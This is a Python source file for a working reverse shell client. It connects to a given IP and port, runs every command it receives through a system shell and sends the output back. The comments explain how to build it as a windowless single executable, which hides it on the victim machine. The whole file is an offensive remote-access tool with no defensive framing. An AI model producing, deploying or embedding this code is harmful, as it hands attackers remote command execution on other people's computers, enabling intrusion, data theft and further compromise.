import socket
import subprocess
import sys
import os

# To compile this program, use pyinstaller: .\pyinstaller.exe --noconsole --onefile main.py
# To run the program provide an IP and a port to connect to, like so: .\shell.exe 127.0.0.1 8080
# To exit the program, type 'exit'. (Don't use ctrl-c else the program will continue running in background).


class ShellExe:
    def connect(self, ip, port):
        s = socket.socket()
        s.connect((ip, port))
        while True:
            command = s.recv(1024)
            if 'exit' in command.decode():
                s.close()
                break
            if 'cd' in command.decode().split(" ")[0]:
                self.change_directory(command.decode())

            cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())

    def change_directory(self, command):
        if len(command) == 3:
            os.getcwd()
        else:
            try:
                directory = command.split(" ")[1][:-1]
                os.chdir(directory)
            except FileNotFoundError:
                try:
                    directory = command.split(" ")[1][:-1]
                    if os.getcwd().split("\\")[-1] != directory:
                        os.chdir(os.getcwd() + "\\" + directory)
                    else:
                        pass
                except FileNotFoundError:
                    pass
            except OSError:
                try:
                    os.chdir(os.getcwd() + "\\" + ' '.join(command.split(" ")[1:]).strip('"')[:-2])
                except Exception:
                    pass


if len(sys.argv) != 3:
    sys.exit()
else:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    program = ShellExe()
    program.connect(ip, port)
